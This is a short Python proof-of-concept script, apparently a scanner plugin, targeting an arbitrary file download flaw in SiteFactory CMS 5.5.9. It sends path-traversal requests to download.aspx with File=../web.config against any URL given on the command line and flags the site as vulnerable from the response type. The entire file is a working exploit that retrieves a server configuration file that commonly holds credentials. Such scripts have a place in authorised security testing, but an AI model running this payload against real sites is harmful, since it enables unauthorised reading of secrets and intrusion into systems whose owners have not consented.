#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: SiteFactory CMS 5.5.9任意文件下载漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-062598
author: Lucifer
description: 文件/jyxx/manage/download.aspx参数File未过滤可下载任意文件。
'''
import sys
import requests
import warnings
def run(url):
        result=['','不存在']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = ["/manage/download.aspx?File=../web.config",
                    "/web/manage/download.aspx?File=../web.config"]
        try:
            noexist = True
            for payload in payloads:
                vulnurl = url + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if req.headers["Content-Type"] == "application/xml":
                    result[1]=  '存在'
                    result[0] = vulnurl
                    noexist = False
            if noexist:
                result[1]=  '不存在'

        except:
            result[1]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    